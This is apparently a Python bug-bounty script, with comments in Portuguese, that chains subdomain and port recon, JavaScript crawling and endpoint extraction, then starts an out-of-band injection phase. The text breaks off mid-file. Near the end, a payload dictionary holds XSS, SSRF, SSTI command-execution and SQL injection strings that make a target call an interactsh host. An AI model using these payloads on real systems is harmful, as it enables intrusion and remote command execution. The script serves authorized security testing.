#!/usr/bin/env python3
"""
jsrecon_oob.py — JS Recon + OOB Injection para Bug Bounty
Uso EXCLUSIVO em programas com escopo autorizado.

Fluxo:
  Fase 1 — Recon JS
    subfinder / assetfinder → subdomínios
    nmap → portas abertas
    httpx → hosts vivos
    gau + waybackurls + gospider + katana → URLs históricas
    Playwright → JS carregado em runtime

  Fase 2 — Filtro rigoroso de endpoints
    • Descarta template literals JS: ${P}, ${l}, ${A}, ${resource}
    • Descarta domínios externos ao target (stripe, google, etc.)
    • Aceita apenas: target.com / *.target.com / paths relativos
    • Agrupa por método: endpoints_get.txt / post / put / patch

  Fase 3 — OOB Injection
    • Injeta payload interactsh em cada parâmetro de query string
    • Injeta nos headers HTTP (SSRF via header)
    • UID único por payload com timestamp — cruzamento preciso com log
    • Monitora interactsh-client em paralelo com a injeção

Uso:
  python3 jsrecon_oob.py target.com -o abc123.oast.fun
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --no-nmap --workers 20
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --skip-recon
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --no-oob --workers 30
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --monitor-time 900

Dependências Python:
  pip install requests urllib3 playwright tenacity jsbeautifier
  playwright install chromium

Dependências Go:
  go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
  go install github.com/tomnomnom/assetfinder@latest
  go install github.com/projectdiscovery/httpx/cmd/httpx@latest
  go install github.com/lc/gau/v2/cmd/gau@latest
  go install github.com/tomnomnom/waybackurls@latest
  go install github.com/jaeles-project/gospider@latest
  go install github.com/projectdiscovery/katana/cmd/katana@latest
  go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
"""

from __future__ import annotations

import argparse
import asyncio
import collections
import hashlib
import json
import logging
import re
import secrets
import shlex
import shutil
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

import requests
from tenacity import (
    before_sleep_log, retry, retry_if_exception_type,
    stop_after_attempt, wait_exponential,
)

try:
    from playwright.async_api import async_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

try:
    import jsbeautifier
    HAS_BEAUTIFY = True
except ImportError:
    HAS_BEAUTIFY = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── Portas ──────────────────────────────────────────────────────────────────
HTTP_PORTS  = [80,81,443,3000,3001,4000,4443,5000,6000,6443,6885,
               7077,8000,8080,8081,8181,8443,9000,9091,9443,9999,10000]
NMAP_PORTS  = ",".join(str(p) for p in sorted(set(HTTP_PORTS)))
HTTPS_PORTS = {443,8443,9443,4443,6443,10000}

# ─── CDNs — sempre descartados ───────────────────────────────────────────────
_CDN_RE = re.compile(
    r'(?:cdnjs\.cloudflare\.com|cdn\.jsdelivr\.net|unpkg\.com|'
    r'ajax\.googleapis\.com|stackpath\.bootstrapcdn\.com|'
    r'maxcdn\.bootstrapcdn\.com|code\.jquery\.com|'
    r'cdn\.datatables\.net|static\.cloudflareinsights\.com|'
    r'fonts\.googleapis\.com|fonts\.gstatic\.com)',
    re.I,
)

# ─── Cores ───────────────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

    @staticmethod
    def strip(s: str) -> str:
        return re.sub(r'\033\[[0-9;]*m', '', s)

# ─────────────────────────────────────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────────────────────────────────────

class _CleanFile(logging.FileHandler):
    def emit(self, record):
        record.msg = C.strip(str(record.msg))
        super().emit(record)

_log_lock = threading.Lock()

def setup_logging(log_file: Path) -> logging.Logger:
    lg = logging.getLogger("jsrecon_oob")
    lg.setLevel(logging.DEBUG)
    lg.handlers.clear()
    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", "%H:%M:%S")
    ch  = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.INFO)
    ch.setFormatter(logging.Formatter("%(message)s"))
    lg.addHandler(ch)
    fh = _CleanFile(log_file, encoding="utf-8")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(fmt)
    lg.addHandler(fh)
    return lg

def clog(lg: logging.Logger, msg: str, color: str = C.RESET, level: str = "info"):
    with _log_lock:
        getattr(lg, level)(f"{color}{msg}{C.RESET}")

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS GERAIS
# ─────────────────────────────────────────────────────────────────────────────

def tool_ok(name: str) -> bool:
    return shutil.which(name) is not None

def run_cmd(cmd: list[str], lg: logging.Logger,
            stdin: str | None = None, timeout: int = 300) -> list[str]:
    try:
        r = subprocess.run(cmd, input=stdin, capture_output=True,
                           text=True, timeout=timeout)
        if r.stderr:
            lg.debug("[stderr:%s] %s", cmd[0], r.stderr.strip()[:200])
        return [l for l in r.stdout.splitlines() if l.strip()]
    except FileNotFoundError:
        lg.warning("Ausente: %s", cmd[0])
        return []
    except subprocess.TimeoutExpired:
        lg.warning("Timeout: %s", " ".join(cmd[:3]))
        return []
    except Exception as e:
        lg.error("Erro %s: %s", cmd[0], e)
        return []

def _write(path: Path, lines, lg: logging.Logger) -> None:
    content = [str(l) for l in lines if str(l).strip()]
    if not content:
        return
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(content) + "\n", encoding="utf-8")
    lg.debug("Salvo: %s (%d linhas)", path, len(content))

def _append_line(path: Path, line: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")

# ─────────────────────────────────────────────────────────────────────────────
# UID COLLISION-FREE (do oob_scanner)
# ─────────────────────────────────────────────────────────────────────────────

_uid_seen: set[str] = set()
_uid_lock = threading.Lock()

def unique_id(category: str, param: str) -> str:
    cat  = re.sub(r'[^a-z0-9]', '', category.lower())[:3]
    par  = re.sub(r'[^a-z0-9]', '', param.lower())[:4]
    ts   = str(int(time.time() * 1000))
    rand = secrets.token_hex(3)
    uid  = f"{cat}-{ts}-{rand}-{par}"
    with _uid_lock:
        while uid in _uid_seen:
            uid = f"{cat}-{ts}-{secrets.token_hex(3)}-{par}"
        _uid_seen.add(uid)
    return uid

# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD LOG (do oob_scanner)
# ─────────────────────────────────────────────────────────────────────────────

class PayloadLog:
    def __init__(self, log_file: Path):
        self.log_file  = log_file
        self._by_uid:  dict[str, dict] = {}
        self._all:     list[dict]      = []
        self._lock     = threading.Lock()

    @property
    def entries(self) -> list[dict]:
        with self._lock:
            return list(self._all)

    def record(self, uid: str, url: str, param: str,
               category: str, payload: str) -> dict:
        entry = {
            "uid":       uid,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "unix_ts":   int(time.time() * 1000),
            "category":  category,
            "url":       url,
            "param":     param,
            "payload":   payload,
        }
        with self._lock:
            self._by_uid[uid] = entry
            self._all.append(entry)
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(entry) + "\n")
        return entry

    def find_fuzzy(self, raw_id: str) -> Optional[dict]:
        with self._lock:
            for uid, entry in self._by_uid.items():
                if uid in raw_id:
                    return entry
        return None

    def load_existing(self):
        """Recarrega log de sessão anterior para --poll."""
        if self.log_file.exists():
            for line in self.log_file.read_text().splitlines():
                try:
                    e = json.loads(line)
                    self._by_uid[e["uid"]] = e
                    self._all.append(e)
                except Exception:
                    pass

# ─────────────────────────────────────────────────────────────────────────────
# FASE 1-A: SUBDOMÍNIOS
# ─────────────────────────────────────────────────────────────────────────────

def enum_subdomains(domain: str, out: Path, lg: logging.Logger) -> set[str]:
    import os
    subs: set[str] = set()
    clog(lg, "\n━━━ Subdomínios ━━━", C.BLUE + C.BOLD)

    if tool_ok("subfinder"):
        lines = run_cmd(["subfinder", "-d", domain, "-silent"], lg, timeout=300)
        subs.update(lines)
        clog(lg, f"  subfinder: {len(lines)}", C.GREEN)
    if tool_ok("assetfinder"):
        lines = run_cmd(["assetfinder", "--subs-only", domain], lg, timeout=180)
        subs.update(lines)
        clog(lg, f"  assetfinder: {len(lines)}", C.GREEN)

    chaos_key = os.environ.get("CHAOS_KEY", "").strip()
    if tool_ok("chaos") and chaos_key:
        lines = run_cmd(["chaos", "-d", domain, "-key", chaos_key, "-silent"], lg, timeout=180)
        subs.update(lines)
        clog(lg, f"  chaos: {len(lines)}", C.GREEN)

    github_token = os.environ.get("GITHUB_TOKEN", "").strip()
    if tool_ok("github-subdomains") and github_token:
        lines = run_cmd(["github-subdomains", "-d", domain, "-t", github_token, "-raw"], lg, timeout=120)
        subs.update(lines)
        clog(lg, f"  github-subdomains: {len(lines)}", C.GREEN)

    clean = {s.strip().lower() for s in subs
             if s.strip() and "*" not in s and domain in s}
    clean.add(domain)
    _write(out / "subdomains.txt", sorted(clean), lg)
    clog(lg, f"  Total únicos: {len(clean)}", C.GREEN + C.BOLD)
    return clean

# ─────────────────────────────────────────────────────────────────────────────
# FASE 1-B: NMAP
# ─────────────────────────────────────────────────────────────────────────────

def nmap_scan(subs: set[str], out: Path, lg: logging.Logger) -> dict[str, list[int]]:
    clog(lg, f"\n━━━ Nmap ({len(subs)} hosts) ━━━", C.BLUE + C.BOLD)
    if not tool_ok("nmap"):
        clog(lg, "  nmap ausente — assumindo 80/443", C.YELLOW)
        return {s: [80, 443] for s in subs}

    hosts_file = out / "_nmap_hosts.txt"
    _write(hosts_file, sorted(subs), lg)
    nmap_out = out / "nmap_results.txt"

    run_cmd(["nmap", "-iL", str(hosts_file), "-p", NMAP_PORTS,
             "--open", "-T4", "--max-retries", "1",
             "--host-timeout", "30s", "-oN", str(nmap_out), "-n"],
            lg, timeout=1800)

    open_ports: dict[str, list[int]] = {}
    if nmap_out.exists():
        current = None
        for line in nmap_out.read_text(errors="ignore").splitlines():
            hm = re.match(r'^Nmap scan report for (.+)', line)
            if hm:
                current = re.sub(r'\s*\(.*?\)', '', hm.group(1)).strip()
                open_ports.setdefault(current, [])
            pm = re.match(r'^(\d+)/tcp\s+open', line)
            if pm and current:
                open_ports[current].append(int(pm.group(1)))

    for s in subs:
        open_ports.setdefault(s, [])

    total = sum(len(v) for v in open_ports.values())
    clog(lg, f"  Portas abertas: {total}", C.GREEN)
    return open_ports

# ─────────────────────────────────────────────────────────────────────────────
# FASE 1-C: HTTPX
# ─────────────────────────────────────────────────────────────────────────────

def httpx_probe(open_ports: dict[str, list[int]], out: Path,
                lg: logging.Logger) -> tuple[list[str], set[str]]:
    clog(lg, "\n━━━ httpx ━━━", C.BLUE + C.BOLD)

    candidates: set[str] = set()
    for host, ports in open_ports.items():
        for port in set(ports) | {80, 443}:
            scheme = "https" if port in HTTPS_PORTS else "http"
            candidates.add(f"{scheme}://{host}:{port}")
            if port == 443: candidates.add(f"https://{host}")
            if port == 80:  candidates.add(f"http://{host}")

    if not tool_ok("httpx"):
        clog(lg, "  httpx ausente — usando candidatos sem validação", C.YELLOW)
        urls = sorted(candidates)
        hosts = {urlparse(u).netloc.split(":")[0].lower() for u in urls}
        _write(out / "hosts_alive.txt", urls, lg)
        return urls, hosts

    clog(lg, f"  Testando {len(candidates)} candidatos...", C.CYAN)
    try:
        result = subprocess.run(
            ["httpx", "-silent", "-mc", "200,201,204,301,302,307,308,401,403",
             "-threads", "50", "-timeout", "8", "-follow-redirects"],
            input="\n".join(sorted(candidates)) + "\n",
            capture_output=True, text=True, timeout=600,
        )
        urls_clean = [u.strip() for u in result.stdout.splitlines()
                      if u.strip().startswith("http")]
    except Exception as e:
        lg.error("httpx error: %s", e)
        urls_clean = sorted(candidates)

    confirmed = {urlparse(u).netloc.lower().split(":")[0] for u in urls_clean}
    _write(out / "hosts_alive.txt", sorted(set(urls_clean)), lg)
    clog(lg, f"  Hosts vivos: {len(urls_clean)}", C.GREEN + C.BOLD)
    return sorted(set(urls_clean)), confirmed

# ─────────────────────────────────────────────────────────────────────────────
# FASE 1-D: COLETA DE JS (ferramentas)
# ─────────────────────────────────────────────────────────────────────────────

def collect_js_tools(domain: str, alive_urls: list[str],
                     lg: logging.Logger) -> set[str]:
    js: set[str] = set()
    clog(lg, "\n━━━ Coleta de JS (ferramentas) ━━━", C.BLUE + C.BOLD)

    if tool_ok("gau"):
        lines = run_cmd(["gau", "--subs", "--blacklist",
                         "png,jpg,gif,svg,css,woff,woff2,ttf,eot,mp4",
                         domain], lg, timeout=300)
        before = len(js)
        for l in lines:
            if ".js" in urlparse(l).path.lower() and not _CDN_RE.search(l):
                js.add(l.strip())
        clog(lg, f"  gau: +{len(js)-before}", C.GREEN)

    if tool_ok("waybackurls"):
        lines = run_cmd(["waybackurls", domain], lg, timeout=300)
        before = len(js)
        for l in lines:
            if ".js" in urlparse(l).path.lower() and not _CDN_RE.search(l):
                js.add(l.strip())
        clog(lg, f"  waybackurls: +{len(js)-before}", C.GREEN)

    if tool_ok("gospider"):
        before = len(js)
        for url in alive_urls[:30]:
            lines = run_cmd(
                ["gospider", "-s", url, "-d", "2", "-t", "5", "--js", "--quiet"],
                lg, timeout=120)
            for l in lines:
                m = re.search(r'https?://[^\s"\'<>]+\.js\b[^\s"\'<>]*', l)
                if m and not _CDN_RE.search(m.group(0)):
                    js.add(m.group(0))
        clog(lg, f"  gospider: +{len(js)-before}", C.GREEN)

    if tool_ok("katana"):
        before = len(js)
        for url in alive_urls[:30]:
            lines = run_cmd(
                ["katana", "-u", url, "-d", "3", "-jc", "-silent"],
                lg, timeout=120)
            for l in lines:
                if ".js" in urlparse(l).path.lower() and not _CDN_RE.search(l):
                    js.add(l.strip())
        clog(lg, f"  katana: +{len(js)-before}", C.GREEN)

    js = {u for u in js if not u.endswith(".js.map")}
    clog(lg, f"  Total JS bruto: {len(js)}", C.GREEN + C.BOLD)
    return js

# ─────────────────────────────────────────────────────────────────────────────
# FASE 1-E: PLAYWRIGHT
# ─────────────────────────────────────────────────────────────────────────────

async def _pw_crawl(url: str, timeout_s: int, wait_s: int,
                    headless: bool, lg: logging.Logger) -> list[str]:
    if not HAS_PLAYWRIGHT:
        return []
    found: list[str] = []
    seen: set[str] = set()
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=headless)
        ctx = await browser.new_context(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/124.0.0.0 Safari/537.36"
            ),
            ignore_https_errors=True,
        )
        page = await ctx.new_page()
        def on_req(req):
            ru = req.url
            if ".js" in urlparse(ru).path.lower() and ru not in seen:
                if not _CDN_RE.search(ru):
                    seen.add(ru)
                    found.append(ru)
        page.on("request", on_req)
        try:
            await page.goto(url, timeout=timeout_s * 1000, wait_until="networkidle")
        except Exception as e:
            lg.debug("  [browser] timeout %s: %s", url, e)
        if wait_s > 0:
            await asyncio.sleep(wait_s)
        await browser.close()
    return found

async def playwright_all(targets: list[str], headless: bool,
                         lg: logging.Logger) -> set[str]:
    all_js: set[str] = set()
    for i, url in enumerate(targets, 1):
        clog(lg, f"  [browser {i}/{len(targets)}] {url}", C.CYAN)
        try:
            files = await _pw_crawl(url, timeout_s=30, wait_s=2,
                                    headless=headless, lg=lg)
            all_js.update(files)
            clog(lg, f"    → {len(files)} JS", C.DIM)
        except Exception as e:
            lg.error("  [browser] %s: %s", url, e)
    return all_js

# ─────────────────────────────────────────────────────────────────────────────
# FASE 2: FILTRO DE ENDPOINTS (núcleo da melhoria)
# ─────────────────────────────────────────────────────────────────────────────

# Detecta qualquer template literal JS no path
_TMPL_LITERAL  = re.compile(r'\$\{[^}]*\}')
# Detecta concatenação JS: "path/" + variable
_JS_CONCAT     = re.compile(r'"\s*\+\s*\w|\w\s*\+\s*"')
# Paths que são só variáveis sem texto real
_ONLY_VAR      = re.compile(r'^[/${}()\w]*\$\{[^}]+\}[/${}()\w]*$')
# Extensões estáticas — nunca são endpoints de API
_STATIC_EXT    = re.compile(
    r'\.(png|jpg|jpeg|gif|ico|svg|webp|woff|woff2|ttf|eot|css|map|txt|pdf|zip|gz)$',
    re.I
)
# Paths que são claramente assets de framework
_ASSET_PATH    = re.compile(
    r'(?:/__webpack|/static/|/assets/|/dist/|/build/|\.chunk\.js|\.bundle\.js)',
    re.I
)


def is_valid_endpoint(path: str, target_domain: str,
                      confirmed_hosts: set[str]) -> tuple[bool, str]:
    """
    Valida se o endpoint realmente pertence ao target e é um endpoint real.
    Retorna (válido, motivo_de_rejeição).
    """
    if not path or len(path) < 3:
        return False, "too_short"

    # ── Rejeita template literals JS ──────────────────────────────────────
    # Ex: /api/validate?domain=${P}  /resolve?name=${l}&type=MX
    if _TMPL_LITERAL.search(path):
        return False, "js_template_literal"

    # ── Rejeita paths que são pura concatenação JS ────────────────────────
    if _JS_CONCAT.search(path):
        return False, "js_concat"

    # ── Rejeita extensões estáticas ───────────────────────────────────────
    clean_path = path.split("?")[0]
    if _STATIC_EXT.search(clean_path):
        return False, "static_asset"

    # ── Rejeita paths de asset de framework ──────────────────────────────
    if _ASSET_PATH.search(path):
        return False, "framework_asset"

    # ── Para URLs absolutas: verifica se é do target ──────────────────────
    if path.startswith(("http://", "https://", "ws://", "wss://")):
        try:
            host = urlparse(path).netloc.lower().split(":")[0]
        except Exception:
            return False, "parse_error"

        root = target_domain.lower().lstrip("*.")

        # Aceita: target.com, sub.target.com, hosts confirmados pelo httpx
        if host == root:
            return True, "ok"
        if host.endswith(f".{root}"):
            return True, "ok"
        if host in confirmed_hosts:
            return True, "ok"

        # Descarta domínio externo
        return False, f"external:{host}"

    # ── Path relativo — sempre do target (será resolvido depois) ──────────
    if path.startswith("/"):
        return True, "ok"

    # ── Paths sem / inicial mas sem domínio — descarta ────────────────────
    return False, "no_domain_no_slash"


def resolve_endpoint_url(path: str, js_url: str,
                         target_domain: str) -> str:
    """Constrói URL absoluta respeitando o host de origem do JS."""
    if path.startswith(("http://", "https://", "ws://", "wss://")):
        return path
    parsed = urlparse(js_url)
    if parsed.scheme and parsed.netloc:
        base = f"{parsed.scheme}://{parsed.netloc}"
    else:
        base = f"https://{target_domain}"
    return base + (path if path.startswith("/") else "/" + path)


# ─────────────────────────────────────────────────────────────────────────────
# PADRÕES DE EXTRAÇÃO DE ENDPOINTS (do jsrecon2 — mantidos)
# ─────────────────────────────────────────────────────────────────────────────

def _endpoint_patterns() -> list[tuple[str, re.Pattern, str]]:
    Q  = r'[\x22\x27\x60]'
    NQ = r'[^\x22\x27\x60\s]'
    I  = re.I
    return [
        ("fetch_get",      re.compile(rf'(?:fetch|axios\.get|http\.get)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "GET"),
        ("fetch_post",     re.compile(rf'(?:fetch|axios\.post|http\.post)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "POST"),
        ("fetch_put",      re.compile(rf'(?:axios\.put|http\.put)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "PUT"),
        ("fetch_delete",   re.compile(rf'(?:axios\.delete|http\.delete)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "DELETE"),
        ("fetch_patch",    re.compile(rf'(?:axios\.patch|http\.patch)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "PATCH"),
        ("fetch_method",   re.compile(rf'fetch\s*\(\s*{Q}({NQ}{{3,}}){Q}\s*,\s*\{{[^}}]*method\s*:\s*[\x22\x27](\w+)[\x22\x27]', I), "DYNAMIC"),
        ("xhr_open",       re.compile(rf'\.open\s*\(\s*[\x22\x27](\w+)[\x22\x27]\s*,\s*{Q}({NQ}{{3,}}){Q}', I), "XHR"),
        ("api_versioned",  re.compile(rf'{Q}(/api/v\d+[a-zA-Z0-9/_\-]*(?:\?[^\s\x22\x27\x60]*)?){Q}'), "ANY"),
        ("graphql",        re.compile(rf'{Q}((?:/graphql|/gql)(?:\?[^\s\x22\x27\x60]*)?){Q}', I), "POST"),
        ("versioned_path", re.compile(rf'{Q}(/v\d+/[a-zA-Z0-9/_\-]{{3,}}(?:\?[^\s\x22\x27\x60]*)?){Q}'), "ANY"),
        ("router_path",    re.compile(rf'(?:path|route|to|url)\s*:\s*{Q}(/[a-zA-Z0-9/_\-:]{{3,}}(?:\?[^\s\x22\x27\x60]*)?){Q}', I), "GET"),
        ("href_action",    re.compile(rf'(?:href|action)\s*[=:]\s*{Q}(/[a-zA-Z0-9/_\-\.]{{3,}}(?:\?[^\s\x22\x27\x60]*)?){Q}', I), "GET"),
        ("url_with_query", re.compile(rf'{Q}((?:https?://[^\s\x22\x27\x60]+)?/[a-zA-Z0-9/_\-]{{2,}}\?(?:[a-zA-Z0-9_%\-]+=\w+&?)+){Q}', I), "GET"),
        ("websocket",      re.compile(rf'new\s+WebSocket\s*\(\s*{Q}(wss?://[^\s\x22\x27\x60]+){Q}', I), "WS"),
        ("env_url",        re.compile(rf'(?:apiUrl|baseUrl|endpointUrl|API_URL|BASE_URL)\s*[:=]\s*{Q}({NQ}{{5,}}){Q}', I), "ANY"),
        ("generic_path",   re.compile(rf'{Q}(/(?:api|v\d|auth|user|admin|account|login|logout|register|profile|settings|upload|download|search|order|payment|checkout|cart)[a-zA-Z0-9/_\-]*){Q}', I), "ANY"),
    ]

ENDPOINT_PATTERNS = _endpoint_patterns()

# ─────────────────────────────────────────────────────────────────────────────
# EXTRAÇÃO DE BODY PARAMS
# ─────────────────────────────────────────────────────────────────────────────

_BODY_RE = re.compile(
    r'(?:body|data|payload)\s*[:=]\s*(?:JSON\.stringify\s*)?\{([^}]{1,600})\}',
    re.I | re.DOTALL
)
_KEY_RE  = re.compile(r'["\']([a-zA-Z_][a-zA-Z0-9_]{1,40})["\']')

def extract_body_params(content: str, pos: int) -> list[str]:
    window = content[max(0, pos - 200): pos + 600]
    params = []
    for bm in _BODY_RE.finditer(window):
        for km in _KEY_RE.finditer(bm.group(1)):
            k = km.group(1)
            if k not in ("null", "true", "false", "undefined"):
                params.append(k)
    return list(dict.fromkeys(params))

# ─────────────────────────────────────────────────────────────────────────────
# ANÁLISE DE JS → extrai endpoints com filtro rigoroso
# ─────────────────────────────────────────────────────────────────────────────

_seen_endpoints: set[tuple] = set()
_ep_lock        = threading.Lock()

_analyzed_js:   set[str]        = set()
_analyzed_lock: threading.Lock  = threading.Lock()


def analyze_js_content(content: str, js_url: str,
                       target_domain: str, confirmed_hosts: set[str],
                       lg: logging.Logger) -> list[dict]:
    """
    Extrai endpoints do conteúdo JS, aplicando filtro rigoroso.
    Retorna lista de endpoint dicts.
    """
    if HAS_BEAUTIFY:
        try:
            content = jsbeautifier.beautify(content)
        except Exception:
            pass

    found = []
    for label, pattern, method_hint in ENDPOINT_PATTERNS:
        for m in pattern.finditer(content):
            # Extrai path e método
            if label == "xhr_open":
                method = m.group(1).upper()
                path   = m.group(2).strip().strip("\"'`")
            elif method_hint == "DYNAMIC" and m.lastindex and m.lastindex >= 2:
                path   = m.group(1).strip().strip("\"'`")
                method = m.group(2).upper()
            else:
                path   = m.group(1).strip().strip("\"'`")
                method = method_hint

            if not path:
                continue

            # ── FILTRO RIGOROSO ──────────────────────────────────────────
            valid, reason = is_valid_endpoint(path, target_domain, confirmed_hosts)
            if not valid:
                lg.debug("  [DROP][%s] %s → %s", reason, path[:80], js_url)
                continue

            # Resolve para URL absoluta
            abs_url = resolve_endpoint_url(path, js_url, target_domain)

            # Dedup por (method, path_sem_query)
            key = (method if method != "ANY" else "*",
                   abs_url.split("?")[0].rstrip("/") or "/")
            with _ep_lock:
                if key in _seen_endpoints:
                    continue
                _seen_endpoints.add(key)

            # Extrai parâmetros
            query_params = ""
            if "?" in path:
                query_params = path.split("?", 1)[1].split("#")[0]

            body_params: list[str] = []
            if method in ("POST", "PUT", "PATCH", "DYNAMIC", "ANY"):
                body_params = extract_body_params(content, m.start())

            ep = {
                "method":      method,
                "path":        path,
                "absolute_url": abs_url,
                "query_params": query_params,
                "body_params": body_params,
                "js_source":   js_url,
                "origin_host": urlparse(js_url).netloc or target_domain,
                "label":       label,
            }
            found.append(ep)
            lg.debug("  [EP][%s] %s ← %s", method, path[:80], js_url)

    return found


def _is_real_js(resp: requests.Response, content: str) -> bool:
    ct = resp.headers.get("Content-Type", "")
    if "javascript" in ct or "ecmascript" in ct:
        return True
    s = content.strip()
    if s.startswith(("<html", "<!DOCTYPE", "<?xml")):
        return False
    return True


def process_one_js(url: str, target_domain: str, confirmed_hosts: set[str],
                   cache_dir: Path, cfg: dict,
                   lg: logging.Logger, get_fn) -> list[dict]:
    key = url.split("?")[0]
    with _analyzed_lock:
        if key in _analyzed_js:
            return []
        _analyzed_js.add(key)

    # Cache em disco (24h)
    cf = cache_dir / (hashlib.sha1(key.encode()).hexdigest()[:16] + ".json")
    if cf.exists() and not cfg.get("no_cache"):
        try:
            d = json.loads(cf.read_text(encoding="utf-8"))
            if d.get("v") == "3" and time.time() - d.get("ts", 0) < 86400:
                return analyze_js_content(d["c"], url, target_domain,
                                          confirmed_hosts, lg)
        except Exception:
            pass

    try:
        resp = get_fn(url)
    except Exception as e:
        lg.debug("Falha %s: %s", url, e)
        return []

    if resp.status_code != 200:
        return []
    content = resp.text
    if not _is_real_js(resp, content):
        return []

    if not cfg.get("no_cache"):
        try:
            cf.parent.mkdir(parents=True, exist_ok=True)
            cf.write_text(
                json.dumps({"v": "3", "ts": time.time(), "c": content},
                           ensure_ascii=False),
                encoding="utf-8",
            )
        except Exception:
            pass

    return analyze_js_content(content, url, target_domain, confirmed_hosts, lg)


def _make_get_fn(cfg: dict):
    _req_lg = logging.getLogger("jsrecon_oob.req")
    @retry(stop=stop_after_attempt(3),
           wait=wait_exponential(multiplier=1, min=2, max=30),
           retry=retry_if_exception_type((
               requests.exceptions.ConnectionError,
               requests.exceptions.Timeout,
           )),
           before_sleep=before_sleep_log(_req_lg, logging.DEBUG),
           reraise=True)
    def _get(url: str, **kw) -> requests.Response:
        return requests.get(
            url,
            headers={"User-Agent": "Mozilla/5.0 (compatible; jsrecon_oob/1.0)"},
            timeout=cfg.get("timeout", 10),
            verify=False, allow_redirects=True, **kw,
        )
    return _get


def analyze_all_js(js_urls: list[str], target_domain: str,
                   confirmed_hosts: set[str], out: Path,
                   cfg: dict, lg: logging.Logger) -> list[dict]:
    clog(lg, f"\n━━━ Análise de JS ({len(js_urls)} arquivos) ━━━",
         C.BLUE + C.BOLD)
    cache_dir = out / ".js_cache"
    get_fn    = _make_get_fn(cfg)
    all_eps: list[dict] = []
    workers = cfg.get("workers", 20)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(process_one_js, u, target_domain, confirmed_hosts,
                          cache_dir, cfg, lg, get_fn): u
                for u in js_urls}
        done = 0
        for fut in as_completed(futs):
            done += 1
            if done % 20 == 0:
                clog(lg, f"  Progresso: {done}/{len(js_urls)} JS", C.DIM)
            try:
                eps = fut.result()
                all_eps.extend(eps)
            except Exception as e:
                lg.error("Worker JS error: %s", e)

    clog(lg, f"  Endpoints extraídos (pós-filtro): {len(all_eps)}",
         C.GREEN + C.BOLD)
    return all_eps


# ─────────────────────────────────────────────────────────────────────────────
# SALVA ENDPOINTS AGRUPADOS POR MÉTODO
# ─────────────────────────────────────────────────────────────────────────────

def save_endpoints_by_method(endpoints: list[dict], out: Path,
                             lg: logging.Logger) -> dict[str, Path]:
    """
    Salva endpoints_get.txt / endpoints_post.txt / etc.
    Formato de cada linha: METHOD URL [body_params]
    Retorna dict {method: path_do_arquivo}.
    """
    clog(lg, "\n━━━ Salvando endpoints por método ━━━", C.BLUE + C.BOLD)

    # Normaliza método
    method_map: dict[str, list[dict]] = collections.defaultdict(list)
    for ep in endpoints:
        m = ep["method"].upper()
        if m in ("ANY", "DYNAMIC", "XHR", "WS"):
            # ANY/DYNAMIC → tenta inferir pelo label; fallback GET
            if "post" in ep.get("label", "").lower():
                m = "POST"
            elif "websocket" in ep.get("label", "").lower():
                m = "WS"
            else:
                m = "GET"
        method_map[m].append(ep)

    files: dict[str, Path] = {}
    for method, eps in sorted(method_map.items()):
        fname = out / f"endpoints_{method.lower()}.txt"
        lines = []
        for ep in eps:
            line = ep["absolute_url"]
            if ep.get("query_params"):
                if "?" not in line:
                    line += "?" + ep["query_params"]
            if ep.get("body_params"):
                line += f"  # body: {', '.join(ep['body_params'])}"
            lines.append(line)
        _write(fname, lines, lg)
        files[method] = fname
        clog(lg, f"  [{method:6}] {len(eps):4d} endpoints → {fname.name}", C.GREEN)

    # JSONL completo
    jsonl = out / "endpoints.jsonl"
    with open(jsonl, "w", encoding="utf-8") as f:
        for ep in endpoints:
            f.write(json.dumps(ep, ensure_ascii=False) + "\n")

    return files


# ─────────────────────────────────────────────────────────────────────────────
# FASE 3: OOB INJECTION
# ─────────────────────────────────────────────────────────────────────────────

# Payloads OOB por tipo de injeção
OOB_PAYLOADS = {
    "xss": [
        '"><img src="https://{OOB}/{ID}" onerror=x>',
        "'><script src=https://{OOB}/{ID}></script>",
        '"><svg/onload=fetch(`https://{OOB}/{ID}`)>',
    ],
    "ssrf": [
        "https://{OOB}/{ID}",
        "http://{OOB}/{ID}",
        "dict://{OOB}:80/{ID}",
    ],
    "ssti": [
        "{{''.__class__.__mro__[1].__subclasses__()[407](['curl','https://{OOB}/{ID}'],stdout=-1).communicate()}}",
        "<%= `curl https://{OOB}/{ID}` %>",
        "#{{\"https://{OOB}/{ID}\".class}}",
    ],
    "sqli": [
        "' AND LOAD_FILE(CONCAT(0x5c5c5c5c,'{OOB}',0x5c5c,'{ID}'))-- -",
